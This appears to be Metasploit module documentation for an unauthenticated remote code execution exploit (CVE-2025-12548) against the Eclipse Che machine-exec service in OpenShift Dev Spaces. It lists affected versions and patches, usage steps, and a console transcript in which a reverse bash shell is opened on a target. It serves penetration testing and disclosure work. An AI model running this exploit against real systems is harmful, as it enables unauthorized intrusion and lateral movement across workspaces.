## Vulnerable Application

This module exploits an unauthenticated remote code execution vulnerability (CVE-2025-12548) in the Eclipse Che
machine-exec service. The machine-exec service, exposed on port 3333 within Red Hat OpenShift DevSpaces developer
workspace containers, accepts WebSocket connections without authentication.

An attacker can connect to the machine-exec service and execute arbitrary commands via JSON-RPC over WebSocket.
This allows lateral movement between workspaces and potential cluster compromise.

Affected versions: Red Hat OpenShift Dev Spaces prior to patches RHSA-2025:22620, RHSA-2025:22652, RHSA-2025:22623.

## Verification Steps

1. Start `msfconsole`
2. `use exploit/linux/http/eclipse_che_machine_exec_rce`
3. `set RHOSTS <target>`
4. `set LHOST <your_ip>`
5. `check`
6. `exploit`
7. **Verify** you get a shell session

## Options

### TARGETURI
Base path to the machine-exec service. Default: `/`

### WS_TIMEOUT
Timeout for WebSocket operations in seconds. Default: `10`

## Scenarios

### Red Hat OpenShift DevSpaces (cmd/unix/reverse_bash)

```
msf6 > use exploit/linux/http/eclipse_che_machine_exec_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/eclipse_che_machine_exec_rce) > set RHOSTS 10.138.7.33
RHOSTS => 10.138.7.33
msf6 exploit(linux/http/eclipse_che_machine_exec_rce) > set LHOST 10.138.7.33
LHOST => 10.138.7.33
msf6 exploit(linux/http/eclipse_che_machine_exec_rce) > check
[+] 10.138.7.33:3333 - The target is vulnerable. machine-exec service accepts unauthenticated connections
msf6 exploit(linux/http/eclipse_che_machine_exec_rce) > exploit
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. machine-exec service accepts unauthenticated connections
[*] Connecting to machine-exec service...
[+] Connected to machine-exec service
[*] Staging payload via JSON-RPC create method...
[+] Command staged with process ID: 2
[*] Triggering execution via /attach/2...
[+] Payload triggered!
[*] Command shell session 1 opened (127.0.0.1:4444 -> 127.0.0.1:47578) at 2025-12-30 19:46:55 +0000

whoami
user
```
